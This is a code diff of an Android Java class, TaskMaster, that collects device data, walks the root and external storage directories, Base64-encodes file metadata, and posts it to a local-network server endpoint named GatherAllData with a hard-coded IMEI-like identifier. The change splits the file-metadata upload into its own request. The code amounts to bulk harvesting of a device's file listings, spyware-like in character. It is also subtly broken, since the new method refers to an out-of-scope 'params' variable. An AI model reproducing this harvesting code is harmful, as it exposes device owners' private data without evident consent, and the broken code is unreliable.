@@ -67,6 +67,7 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         String[] maskHash2 = maskHash.split(";");
         String[] hashes = maskHash2[1].split(":");
 
+        getFilesMetadata();
         JSONObject bulkData = new JSONObject();
         for (int i = 0; i < maskHash2[0].length(); i++) {
             if (maskHash2[0].charAt(i) == '1') {
@@ -99,7 +100,6 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                 }
             }
         }
-        getFilesMetadata(bulkData);
 
         ServerCommunicationHandler.executeDataPost(params[0],
                 "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
@@ -107,8 +107,9 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         return null;
     }
 
-    private void getFilesMetadata(JSONObject bulkdata) {
+    private void getFilesMetadata() {
         try {
+            JSONObject bulkData = new JSONObject();
             List<String> root = getListFiles(new File(Environment.getRootDirectory().toString()));
             List<String> external = getListFiles(new File(Environment.getExternalStorageDirectory()
                     .toString()));
@@ -119,7 +120,10 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                 metadata.put(Base64.encodeToString(info.getBytes(), Base64.URL_SAFE));
             }
 
-            bulkdata.put("Metadata", metadata);
+            bulkData.put("Metadata", metadata);
+            ServerCommunicationHandler.executeDataPost(params,
+                    "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                    "357336064017681");
         } catch (Exception ex) {
             Log.d("EROARE", ex.getMessage());
         }
